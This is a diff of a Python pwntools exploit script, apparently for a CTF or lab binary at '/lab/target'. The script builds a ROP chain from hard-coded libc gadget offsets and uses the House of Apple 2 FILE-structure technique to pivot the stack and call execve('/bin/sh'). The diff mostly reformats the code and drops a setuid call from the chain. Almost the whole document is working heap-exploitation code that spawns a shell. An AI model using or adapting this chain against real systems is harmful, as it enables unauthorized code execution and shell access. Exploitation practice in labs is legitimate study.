@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 
-import pwn
 import sys
+
+import pwn
+
 from house_of_apple2 import HouseOfApple2
 
 bin_filename = "/lab/target"
@@ -39,28 +41,23 @@ def rop(p):
     p.sendline(b"0")
     p.recvuntil(b"[*] reading")
 
-    ret         = libc_elf.address + 0x38d00
-    mov_rsp_rdx = libc_elf.address + 0x6310f
-    pop_rdi     = libc_elf.address + 0x11bc7a
-    pop_rsi     = libc_elf.address + 0x5c2e7
-    binsh       = libc_elf.address + 0x1db799
+    ret = libc_elf.address + 0x38D00
+    mov_rsp_rdx = libc_elf.address + 0x6310F
+    pop_rdi = libc_elf.address + 0x11BC7A
+    pop_rsi = libc_elf.address + 0x5C2E7
+    binsh = libc_elf.address + 0x1DB799
 
     rop_chain = (
-        pwn.p64(ret) +                              # avoid _flags & 0x8
-        pwn.p64(pop_rdi) +
-        pwn.p64(0x0) +
-        pwn.p64(pop_rdi) +
-        pwn.p64(0x0) +                              # _IO_write_base
-        pwn.p64(libc_elf.symbols["setuid"])  +
-        pwn.p64(pop_rsi) +
-        pwn.p64(0x0) +                              # _IO_buf_base
-        pwn.p64(pop_rdi) +
-        pwn.p64(binsh) +
-        pwn.p64(libc_elf.symbols["execve"])
+        pwn.p64(ret)  # avoid _flags & 0x8
+        + pwn.p64(pop_rdi)
+        + pwn.p64(binsh)
+        + pwn.p64(pop_rsi)
+        + pwn.p64(0x0)  # _IO_write_base
+        + pwn.p64(libc_elf.symbols["execve"])
     )
-    
+
     _IO_wfile_jumps = libc_elf.symbols["_IO_wfile_jumps"]
-    ptr_to_zero = bin_elf.bss(0xa00)
+    ptr_to_zero = bin_elf.bss(0xA00)
     hoa2 = HouseOfApple2(_IO_wfile_jumps, ptr_to_zero)
 
     # pivot stack and then ROP
@@ -80,16 +77,9 @@ def rop(p):
 
 def main():
     if "--gdb" in sys.argv:
-        p = pwn.gdb.debug(
-            bin_filename,
-            env={},
-            gdbscript=gdbscript
-        )
+        p = pwn.gdb.debug(bin_filename, env={}, gdbscript=gdbscript)
     else:
-        p = pwn.process(
-            bin_filename,
-            env={}
-        )
+        p = pwn.process(bin_filename, env={})
 
     get_libc(p)
     rop(p)
